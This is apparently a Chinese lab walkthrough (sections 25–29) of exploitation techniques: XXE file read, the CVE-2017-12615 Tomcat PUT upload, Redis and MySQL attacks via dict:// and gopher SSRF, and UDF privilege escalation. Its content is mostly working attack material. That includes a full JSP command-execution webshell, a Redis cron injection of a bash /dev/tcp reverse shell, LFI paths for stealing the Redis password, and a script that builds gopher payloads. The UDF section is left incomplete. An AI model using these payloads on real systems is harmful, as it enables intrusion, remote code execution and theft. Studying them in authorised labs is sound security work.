### 25. XML实体注入 (XXE)

#### 概述
本节讨论一个基本的XXE（XML External Entity）外部实体注入场景。用户在登录时提交的XML数据会被服务器后端解析并输出结果，因此可以构造一个XXE来读取本地敏感信息。

#### 实验步骤
1. **构造恶意XML请求**：
   ```http
   POST /doLogin.php HTTP/1.1
   Host: 127.0.0.1
   Content-Length: 153
   Accept: application/xml, text/xml, */*; q=0.01
   X-Requested-With: XMLHttpRequest
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
   Content-Type: application/xml;charset=UTF-8
   Accept-Language: zh-CN,zh;q=0.9
   Connection: close

   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
   <user>&xxe;</user>
   ```

2. **使用脚本处理并发送请求**：
   使用之前编写的脚本处理上述请求，并通过工具（如Burp Suite）发送该请求。确保删除`Encoding`选项。

3. **成功读取Hosts文件**：
   如果配置正确，服务器将返回`/etc/hosts`文件的内容。

### 26. CVE-2017-12615 - Tomcat任意文件写漏洞

#### 概述
CVE-2017-12615 是Tomcat中间件的一个任意文件写漏洞。攻击者可以利用此漏洞上传恶意JSP文件到服务器，从而执行任意代码。

#### 实验步骤
1. **构造PUT请求**：
   ```http
   PUT /shell.jsp/ HTTP/1.1
   Host: 127.0.0.1:8080
   Content-Length: 5
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
   Accept-Language: zh-CN,zh;q=0.9
   Connection: close

   <%@ page import="java.util.*,java.io.*" %>
   <%
   String command = request.getParameter("cmd");
   if(command != null) {
       Process p = Runtime.getRuntime().exec(command);
       OutputStream os = p.getOutputStream();
       InputStream in = p.getInputStream();
       DataInputStream dis = new DataInputStream(in);
       String disr = dis.readLine();
       while (disr != null) {
           out.println(disr);
           disr = dis.readLine();
       }
   } else {
       out.print("format: xxx.jsp?cmd=Command");
   }
   %>
   ```

2. **发送请求并验证**：
   使用脚本或工具发送上述PUT请求。如果服务器返回HTTP状态码201，表示上传成功。注意，某些环境中可能无法执行命令，但了解方法即可。

### 27. Redis未授权访问

#### 概述
当Redis服务器未设置密码且开放在网络中时，攻击者可以利用其进行未授权操作。本例中，我们将展示如何通过Dict协议写入计划任务以反弹Shell。

#### 实验步骤
1. **清空Redis数据库**：
   ```dict
   dict://172.72.23.27:6379/flushall
   ```

2. **设置Redis工作目录为定时任务目录**：
   ```dict
   dict://172.72.23.27:6379/config set dir /var/spool/cron/
   ```

3. **创建定时任务文件**：
   ```dict
   dict://172.72.23.27:6379/config set dbfilename root
   ```

4. **写入反弹Shell的Payload**：
   ```dict
   dict://172.72.23.27:6379/set x '\n\n*/1 * * * * bash -i >%26 /dev/tcp/X.X.X.X/X 0>%261\n\n'
   ```

5. **保存配置**：
   ```dict
   dict://172.72.23.27:6379/save
   ```

6. **成功反弹Shell**：
   确保URL编码正确，并使用Burp Suite抓包以防止浏览器自动编码破坏Payload。

### 28. Redis有认证

#### 概述
当Redis服务器设置了密码时，直接执行命令会失败。本节介绍如何通过LFI漏洞获取Redis密码，并利用未授权写Webshell的脚本生成Gopher数据流进行攻击。

#### 实验步骤
1. **查找Redis配置文件路径**：
   常见路径包括：
   - `/etc/redis.conf`
   - `/etc/redis/redis.conf`
   - `/usr/local/redis/etc/redis.conf`
   - `/opt/redis/ect/redis.conf`

2. **利用LFI漏洞获取密码**：
   通过URL访问配置文件路径：
   ```
   http://172.72.23.28/?file=/etc/redis.conf
   ```

3. **生成Gopher数据流并发送**：
   使用之前编写的Redis未授权写Webshell的脚本生成Gopher数据流，并发送请求。由于没有返回包，需确认操作成功。

### 29. MySQL未授权访问

#### 概述
当MySQL服务器未设置密码且开放在网络中时，攻击者可以利用其进行未授权操作。本节介绍如何通过Gopher协议与MySQL通信并执行SQL查询。

#### 实验步骤
1. **获取MySQL通信数据包**：
   在本地Linux系统上模拟监听端口3306的数据包：
   ```sh
   tcpdump -i lo port 3306 -w mysql.pcapng
   ```

2. **执行SQL查询并获取Flag**：
   ```sh
   mysql -h127.0.0.1 -uroot -e "select * from flag.test union select user(),'www.sqlsec.com';"
   ```

3. **导出原始数据并生成Gopher数据**：
   ```python
   import urllib.parse
   import re

   temp = ""
   with open("Result.txt", "r") as f:
       for line in f.readlines():
           temp += line.strip('\n')
   a = [temp[i:i+2] for i in range(0, len(temp), 2)]
   result = "gopher://172.72.23.29:3306/_%" + "%".join(a)
   print(urllib.parse.quote(result))
   ```

4. **发送Gopher请求**：
   将生成的Gopher URL发送出去，即可执行SQL查询并获取结果。

### 29. 额外 - MySQL UDF提权

#### 概述
MySQL UDF（User-Defined Functions）提权是一种常见的提权手段。本节介绍如何通过SSRF细节找到插件目录并通过Gopher写入动态链接库。

#### 实验步骤
1. **查找插件目录**：
   本地模拟监听端口3306的数据包：
   ```sh
   tcpdump -i lo port 3306 -w mysql.pcapng
   ```

2. **执行命令获取插件路径**：
   ```sh
   mysql -h127.0.0.1 -uroot -e "show variables like '%plugin%';"
   ```

3. **生成流量包并追踪TCP流**：
   使用Wireshark打开流量包，追踪发给3306的TCP流，并导出原始数据。

4. **通过SSRF写入动态链接库**：
   登录MySQL并写入动态链接库地址：
   ```sql
   SELECT ... -- 动态链接库内容
   ```

5. **成功反弹Shell**：
   确认操作成功，并成功反弹Shell。

通过以上步骤，您可以详细了解和实践这些安全漏洞及其利用方法。